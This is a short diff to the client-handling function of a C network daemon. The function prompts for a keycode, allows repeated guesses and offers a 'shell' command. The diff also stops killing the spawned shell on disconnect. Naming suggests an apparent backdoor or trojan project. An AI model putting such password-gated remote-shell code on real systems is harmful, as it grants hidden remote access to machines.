@@ -16,7 +16,7 @@ void		new_client(t_client *client)
 	int		ret;
 	BOOLEAN	login = false;
 
-	dprintf(client->socket, "Enter password : ");
+	dprintf(client->socket, "Keycode: ");
 	client->token = ft_strnew(0);
 	while(42)
 	{
@@ -39,7 +39,8 @@ void		new_client(t_client *client)
 				}
 				else
 				{
-					break ;
+					dprintf(client->socket, "Keycode: ");
+					login = 0;
 				}
 			}
 			else if (login) //logged zone
@@ -59,8 +60,9 @@ void		new_client(t_client *client)
 				else if (strncmp(buf, "shell", 5) == 0)
 				{
 					new_durex_shell(get_durex(), client);
+					return ;
 				}
-				else if (strncmp(buf, "quit", 4) == 0)
+				else if (strncmp(buf, "quit", 4) == 0 || strncmp(buf, "exit", 4) == 0)
 				{
 					dprintf(client->socket, "Goodbye !\n");
 					break ;
@@ -75,9 +77,6 @@ void		new_client(t_client *client)
 			}
 		}
 	}
-	dprintf(client->socket, "CLOSE CONNECTION\n");
-	if (client->shell_port != -1 && client->shell_pid != -1)
-		kill(client->shell_pid, SIGKILL);
 	close(client->socket);
 	client->used = false;
 	free(client->token);
